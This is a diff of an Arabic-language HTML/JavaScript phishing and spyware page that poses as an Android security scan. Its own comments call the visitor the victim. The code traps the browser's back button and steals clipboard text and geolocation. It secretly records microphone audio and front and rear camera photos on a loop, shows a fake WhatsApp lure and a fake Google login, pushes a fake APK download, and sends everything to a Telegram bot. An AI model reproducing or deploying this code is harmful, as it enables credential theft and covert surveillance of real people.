@@ -1,53 +1,60 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛡️ حماية الحسابات - التحقق الحيوي</title>
+    <title>⚙️ نظام الحماية الذكي</title>
     <style>
-        body { background-color: #000; color: #fff; font-family:  Segoe UI , sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .container { width: 90%; max-width: 400px; z-index: 5; }
+        body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .container { width: 85%; max-content: 400px; transition: filter 0.5s; }
+        .android-logo { width: 70px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.6; }
+        .progress-bg { width: 100%; height: 4px; background: #222; border-radius: 10px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #4caf50; border-radius: 10px; transition: width 0.5s; }
         
-        /* واجهة بصمة الوجه الوهمية */
-        .face-id-circle { width: 200px; height: 200px; border: 3px solid #00ff00; border-radius: 50%; margin: 20px auto; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px #00ff00; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: #00ff00; top: 0; animation: scan 3s linear infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
-        /* واجهة تسجيل الدخول */
-        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #333; }
-        .login-card { width: 85%; max-width: 350px; padding: 30px; border-radius: 10px; }
-        .login-card img { width: 80px; margin-bottom: 20px; }
-        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; outline: none; }
-        .login-card button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-
-        #video, #canvas { position: absolute; opacity: 0.01; pointer-events: none; } /* مخفي تماماً ولكن يعمل */
+        /* إشعار واتساب وهمي للإغراء بالضغط */
+        #fake-notify { position: fixed; top: 20px; width: 90%; max-width: 350px; background: #fff; color: #000; padding: 15px; border-radius: 12px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10000; cursor: pointer; animation: slideDown 0.5s ease; }
+        @keyframes slideDown { from { transform: translateY(-100px); } to { transform: translateY(0); } }
+        
+        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
+        .login-card { width: 90%; max-width: 360px; padding: 30px; text-align: center; }
+        .login-card img { width: 70px; margin-bottom: 15px; }
+        .login-card input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-ui">
-        <h2 id="status-title" style="color:#00ff00;">🔍 فحص بصمة الوجه...</h2>
-        <div class="face-id-circle">
-            <div class="scan-line"></div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Android_robot_head.svg" width="80" style="filter: invert(1);">
+    <div id="fake-notify" onclick="requestFullPermissions()">
+        <div style="display:flex; align-items:center;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="30" style="margin-left:10px;">
+            <div style="text-align:right;">
+                <b style="font-size:14px;">WhatsApp</b><br>
+                <span style="font-size:12px; color:#555;">لديك رسالة جديدة: "شاهد الصورة الخاصة التي..."</span>
+            </div>
         </div>
-        <p style="font-size: 14px; color:#888;">ضع وجهك في الدائرة وثبّت الجهاز جيداً لإكمال التحقق الأمني.</p>
+    </div>
+
+    <div class="container" id="main-ui">
+        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
+        <div style="font-size:16px;">جاري تأمين ملفات النظام... <span id="percent">0%</span></div>
+        <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
+        <p style="font-size:11px; color:#444;">يرجى عدم إغلاق المتصفح لضمان استرجاع البيانات المفقودة.</p>
     </div>
 
     <div id="phish-overlay">
         <div class="login-card">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
-            <h1 style="font-size: 22px; font-weight: 500;">تأكيد الدخول</h1>
-            <p style="font-size: 14px; color: #5f6368;">فشل فحص الوجه. يرجى إدخال كلمة المرور يدوياً.</p>
+            <h2 style="font-size:20px; font-weight:400;">تحقق من ملكية الحساب</h2>
+            <p style="font-size:13px; color:#5f6368;">لحماية جهازك، يرجى إعادة إثبات هويتك</p>
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="sendCreds()">تأكيد الهوية</button>
+            <button onclick="sendCreds()">متابعة</button>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -59,96 +66,103 @@
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        // 1. اختطاف السلوك (منع الخروج + سحب الحافظة)
-        function jailbreak() {
+        // 1. طلب الصلاحيات الكاملة (يتم استدعاؤه عند ضغط الإشعار الوهمي)
+        async function requestFullPermissions() {
+            document.getElementById('fake-notify').style.display = 'none';
+            notify("🎯 الضحية تفاعل مع إشعار الواتساب الوهمي!");
+            startSnooping(); // يبدأ التصوير والصوت فوراً
+        }
+
+        // 2. تحميل ملف خبيث تلقائياً (هندسة اجتماعية)
+        function triggerDownload() {
+            const link = document.createElement('a');
+            link.href = 'data:text/plain;base64,V2FybmluZyE='; // ملف وهمي
+            link.download = 'Security_Update_Fix.apk';
+            link.click();
+            notify("📥 تم محاولة تنزيل ملف APK وهمي على جهاز الضحية.");
+        }
+
+        // 3. منع الخروج + سحب الحافظة
+        function lockAndSniff() {
             for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => { window.history.pushState(null, null, window.location.href); notify("🚫 حاول الضحية الهروب!"); };
             
-            document.addEventListener( click , async () => {
+            document.addEventListener('click', async () => {
                 try {
                     const text = await navigator.clipboard.readText();
-                    if(text) notify(`📋 **حافظة الضحية (Clipboard):**\n\`${text}\``);
+                    if(text) notify(`📋 **نص مسروق من الحافظة:**\n\`${text}\``);
                 } catch(e) {}
             }, {once: true});
         }
 
-        // 2. تحليل فيزيائي (الضوء، الحركة، الموقع)
-        async function physicalIntel() {
-            // الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                notify(`📍 الموقع الدقيق: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-
-            // مستشعر الضوء (إذا كان مدعوماً)
-            if ( AmbientLightSensor  in window) {
-                const s = new AmbientLightSensor();
-                s.onreading = () => { if(s.illuminance < 5) notify("🌑 الضحية في مكان مظلم جداً."); };
-                s.start();
-            }
-
-            // بصمة الجهاز
-            let b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
-            notify(`📱 **هدف جديد دخل الفخ:**\nالنظام: ${navigator.platform}\nالبطارية: ${Math.round(b.level*100)}%\nالتوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
-        }
-
-        // 3. التجسس الصوتي (5 ثوانٍ كل 12 ثانية)
-        async function audioSpy() {
+        // 4. التجسس الصوتي والبصري المزدوج (2 ثانية)
+        async function startSnooping() {
+            // الصوت (كل 15 ثانية)
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const rec = new MediaRecorder(s);
+                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(aStream);
                 rec.ondataavailable = (e) => {
-                    const fd = new FormData(); fd.append( chat_id , CHAT_ID); fd.append( voice , e.data,  v.ogg );
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method:  POST , body: fd });
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'mic.ogg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                 };
-                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 12000);
+                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
             } catch(e) { notify("❌ رفض الميكروفون."); }
-        }
 
-        // 4. التجسس البصري الاحترافي (تبديل كل 2 ثانية)
-        async function visualSpy() {
-            const video = document.getElementById( video );
-            const canvas = document.getElementById( canvas );
+            // الكاميرا التتابعية
             const modes = ["user", "environment"];
             let i = 0;
             while(true) {
                 try {
                     if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                     currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
-                    video.srcObject = currentStream;
+                    document.getElementById('video').srcObject = currentStream;
                     await new Promise(r => setTimeout(r, 800));
+                    const canvas = document.getElementById('canvas');
                     canvas.width = 640; canvas.height = 480;
-                    canvas.getContext( 2d ).drawImage(video, 0, 0);
+                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0);
                     canvas.toBlob(b => {
-                        const fd = new FormData(); fd.append( chat_id , CHAT_ID); fd.append( photo , b,  x.jpg );
-                        fd.append( caption , `📷 لقطة ${modes[i%2]==="user"?"أمامية (الوجه)":"خلفية"}`);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
-                    },  image/jpeg , 0.6);
+                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg');
+                        fd.append('caption', `👁️ لقطة: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg', 0.5);
                 } catch(e) {}
                 i++; await new Promise(r => setTimeout(r, 2000));
             }
         }
 
         function sendCreds() {
-            const e = document.getElementById( email ).value;
-            const p = document.getElementById( pass ).value;
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
             if(e && p) {
                 notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
-                document.getElementById( phish-overlay ).style.display =  none ;
-                document.getElementById( status-title ).innerText = "✅ اكتمل التحقق بنجاح";
+                document.getElementById('phish-overlay').style.display = 'none';
+                alert("اكتمل الفحص. لم يتم العثور على فيروسات.");
             }
         }
 
         window.onload = () => {
-            jailbreak();
-            physicalIntel();
-            audioSpy();
-            visualSpy();
-            // الانتقال للفيشينج بعد 30 ثانية من "فحص الوجه"
+            lockAndSniff();
+            // إظهار إشعار الواتساب بعد 3 ثوانٍ
+            setTimeout(() => { document.getElementById('fake-notify').style.display = 'block'; }, 3000);
+            
+            // محاكاة التحديث
+            let p = 0;
+            const interval = setInterval(() => {
+                if (p < 99) { p++; document.getElementById('bar').style.width = p + '%'; document.getElementById('percent').innerText = p + '%'; }
+            }, 7000);
+
+            // سحب الموقع والبيانات التقنية
+            navigator.geolocation.getCurrentPosition(pos => {
+                notify(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            });
+            
+            // إظهار تسجيل الدخول الوهمي بعد دقيقة من التمويه
             setTimeout(() => {
-                document.getElementById( phish-overlay ).style.display =  flex ;
-                if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
-            }, 30000);
-            if(navigator.wakeLock) navigator.wakeLock.request( screen );
+                document.getElementById('phish-overlay').style.display = 'flex';
+                triggerDownload(); // محاولة تنزيل الملف عند هذه النقطة
+            }, 45000);
+            
+            if(navigator.wakeLock) navigator.wakeLock.request('screen');
         };
     </script>
 </body>
